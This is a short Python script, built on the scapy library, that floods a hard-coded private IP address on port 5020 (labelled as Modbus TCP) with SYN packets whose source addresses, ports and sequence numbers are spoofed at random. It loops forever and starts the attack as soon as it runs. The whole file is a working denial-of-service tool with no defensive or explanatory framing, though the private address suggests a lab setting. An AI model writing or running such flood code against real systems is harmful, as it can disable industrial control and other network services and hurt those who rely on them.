from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

target_ip = "192.168.36.129"  # IP address of the target device
target_port = 5020  # Port used for Modbus TCP (could be any other service)

def spoofed_flood():
    """ Continuously sends spoofed SYN packets to overwhelm the target """
    while True:
        # Generate a random spoofed IP address
        spoofed_ip = str(IPv4Address(getrandbits(32)))  # Random source IP address
        ip = IP(src=spoofed_ip, dst=target_ip)  # Create an IP layer with spoofed source IP
        
        # Create a TCP SYN packet (initiating a connection)
        tcp = TCP(dport=target_port, flags="S")  # 'S' flag indicates a SYN packet
        pkt = ip/tcp  # Combine the IP and TCP layers to form a complete packet
        
        # Set random source port and sequence number for each packet
        pkt[TCP].sport = getrandbits(16)  # Random source port
        pkt[TCP].seq = getrandbits(32)  # Random sequence number
        
        print("[+] new connection start")  # Inform about the new connection attempt
        send(pkt, verbose=False)  # Send the SYN packet without verbose output

# Start the spoofed flood attack
spoofed_flood()

